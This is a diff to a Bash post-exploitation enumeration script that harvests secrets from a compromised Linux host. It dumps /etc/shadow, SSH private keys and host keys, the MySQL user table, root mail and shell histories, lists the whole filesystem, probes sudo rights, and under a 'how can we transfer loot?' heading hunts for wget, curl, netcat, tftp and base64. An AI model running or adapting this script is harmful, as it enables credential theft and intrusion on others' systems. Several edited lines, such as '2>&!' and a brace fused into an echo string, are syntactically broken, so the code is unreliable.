@@ -44,8 +44,7 @@ out=$cwd/0hw311.log
 #
 bashrecon(){
 RIGHT_NOW=$(date +"%x %r %Z")
-pubIP=$(curl ipreturn.tk/raw)
-#null='> /dev/null 2&>1'
+pubIP=$(curl ipecho.net/plain;echo)
 ########################
 INTFACES=$(/sbin/ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
 intIPS=$(for i in ${INTFACES}; do /sbin/ifconfig $i | grep Mask | cut -d ':' -f2 | cut -d " " -f1; done)
@@ -66,7 +65,7 @@ if [[ whoami == "root"]]
 then
   iptables -L || echo 'We are not root'
 else
-  sudo iptables -L || echo 'We got no sudo'
+  sudo iptables -V >/dev/null 2>&! || { echo 'We got no sudo' && exit 1 ;}
 fi
 
 arp -e
@@ -136,14 +135,16 @@ cat /etc/passwd
 cat /etc/group
 cat /etc/shadow
 ls -alh /var/mail/
+ls -la ~/.ssh/
+cat ~/.ssh/config
 cat /var/apache2/config.inc
 cat /var/lib/mysql/mysql/user.MYD
 cat /root/anaconda-ks.cfg
 cat ~/.ssh/authorized_keys
 cat ~/.ssh/identity.pub
 cat ~/.ssh/identity
-cat ~/.ssh/id_rsa.pub
-cat ~/.ssh/id_rsa
+cat ~/.ssh/id_rsa*.pub
+cat ~/.ssh/id_rsa*
 cat ~/.ssh/id_dsa.pub
 cat ~/.ssh/id_dsa
 cat /etc/ssh/ssh_config
@@ -156,6 +157,8 @@ cat /etc/ssh/ssh_host_key.pub
 cat /etc/ssh/ssh_host_key
 
 id
+id -u
+groups
 who
 w
 last
@@ -169,6 +172,7 @@ sudo -l
 
 ls -ahlR /root/
 ls -ahlR /home/
+ls -ahlR /
 
 # enum hist
 
@@ -180,8 +184,8 @@ cat ~/.php_history
 # and env
 cat ~/.bashrc
 cat ~/.profile
-cat /var/mail/root
-cat /var/spool/mail/root
+head -n 100 /var/mail/root
+head -n 100 /var/spool/mail/root
 
 # what can we mess with?
 
@@ -331,13 +335,15 @@ fi
 
 # how can we transfer loot?
 which wget || find $fpath -name wget
+which curl || find $fpath -name curl
 which nc || find $fpath -name nc*
 which netcat || find $fpath -name netcat*
 which tftp || find $fpath -name tftp*
 which ftp || find $fpath -name ftp
 which ncat || find $fpath -name ncat*
 which telnet || find $fpath -name telnet*
-}
+echo -en "\nIf you can see a new line here: \n;than this does not have echo -e\n"}
+which base64 || echo 'Wtf no base64'
 
 
 spawnPty(){
